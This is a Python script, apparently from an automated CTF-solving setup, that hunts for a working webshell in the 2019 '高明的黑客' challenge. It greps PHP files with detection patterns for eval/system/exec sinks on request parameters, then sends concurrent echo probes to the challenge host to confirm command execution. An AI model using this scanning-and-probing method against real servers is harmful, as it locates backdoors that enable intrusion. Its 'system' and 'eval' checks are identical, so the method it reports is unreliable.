#!/usr/bin/env python3
import os
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://06eb6af2-149b-4b03-aa9f-8015ffcb155a.node5.buuoj.cn:81"
SRC_DIR = "/home/lls/data/ctf-agent/challenges/154_强网杯_2019_高明的黑客/src"

# 危险函数模式
DANGEROUS_PATTERNS = [
    r'\$_GET\[\'(\w+)\'\]\s*\?\?\s*\'\s*\'',  # $_GET['xxx'] ?? ' '
    r'\$_POST\[\'(\w+)\'\]\s*\?\?\s*\'\s*\'', # $_POST['xxx'] ?? ' '
    r'eval\s*\(\s*\$_GET\[\'(\w+)\'\]',
    r'assert\s*\(\s*\$_GET\[\'(\w+)\'\]',
    r'system\s*\(\s*\$_GET\[\'(\w+)\'\]',
    r'shell_exec\s*\(\s*\$_GET\[\'(\w+)\'\]',
    r'passthru\s*\(\s*\$_GET\[\'(\w+)\'\]',
    r'exec\s*\(\s*\$_GET\[\'(\w+)\'\]',
    r'echo\s*`\{?\s*\$_GET\[\'(\w+)\'\]',
]

def find_potential_params(filepath):
    """从PHP文件中提取可能的参数名"""
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    
    params = set()
    for pattern in DANGEROUS_PATTERNS:
        matches = re.findall(pattern, content)
        params.update(matches)
    
    # 检查是否有危险函数调用
    dangerous_funcs = ['system', 'eval', 'assert', 'shell_exec', 'passthru', 'exec']
    has_dangerous = any(func in content for func in dangerous_funcs)
    
    return params if has_dangerous else set()

def test_shell(filename, param):
    """测试某个文件+参数是否可利用"""
    url = f"{BASE_URL}/src/{filename}"
    try:
        # 测试 system 命令执行
        r = requests.get(url, params={param: 'echo "SHELL_TEST_SUCCESS";'}, timeout=5)
        if 'SHELL_TEST_SUCCESS' in r.text:
            return (filename, param, 'system')
        
        # 测试 eval
        r = requests.get(url, params={param: 'echo "SHELL_TEST_SUCCESS";'}, timeout=5)
        if 'SHELL_TEST_SUCCESS' in r.text:
            return (filename, param, 'eval')
            
    except Exception as e:
        pass
    return None

def main():
    files = [f for f in os.listdir(SRC_DIR) if f.endswith('.php')]
    print(f"[*] 共 {len(files)} 个PHP文件")
    
    results = []
    
    # 先扫描所有文件找参数
    file_params = {}
    for f in files:
        params = find_potential_params(os.path.join(SRC_DIR, f))
        if params:
            file_params[f] = params
    
    print(f"[*] {len(file_params)} 个文件包含潜在参数")
    
    # 并发测试
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for filename, params in file_params.items():
            for param in params:
                futures.append(executor.submit(test_shell, filename, param))
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"[+] 找到: {result}")
                results.append(result)
    
    return results

if __name__ == '__main__':
    main()
